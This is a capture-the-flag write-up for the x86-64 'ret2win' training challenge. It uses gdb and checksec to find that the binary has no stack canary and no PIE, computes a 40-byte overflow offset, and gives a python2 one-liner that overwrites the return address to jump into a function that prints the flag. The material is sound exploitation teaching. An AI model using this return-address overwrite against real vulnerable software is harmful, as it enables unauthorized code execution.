
### ret2win x86 64

Run the binary will see following message.

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

It also tells us that there is a function named ret2win and will cat the flag.txt. Therefore,  we only need to overwrite the return address to the address of the syscall in ret2win function.

Use gdb to gather information.
```
gdb ./ret2win
```
Check the security of ret2win.
```
gdb$ checksec

```
```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
No canary, no pie.

List all functions.
```
gdb$ info functions
```
```
...
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400756  ret2win
...
```
There is indeed a function called ret2win.

Disassemble ret2win to obtain the return address.
```
gdb$ disas ret2win 
```
```
...
0x0000000000400764 <+14>:    mov    edi,0x400943
0x0000000000400769 <+19>:    call   0x400560 <system@plt>
...
```
The address of the syscall is 0x0000000000400764.

Overflow length will be 32 bytes(buffer) + 8 bytes (RBP) = 40 bytes.

Therefore, the overflow strings will be:
```
A'*40+'\x64\x07\x40\x00\x00\x00\x00\x00'
```
Run the process with overflow strings:
```
python2 -c "print 'A'*40+'\x64\x07\x40\x00\x00\x00\x00\x00'" | ./ret2win
```
It will show the flag:
```
ROPE{a_placeholder_32byte_flag!}
```
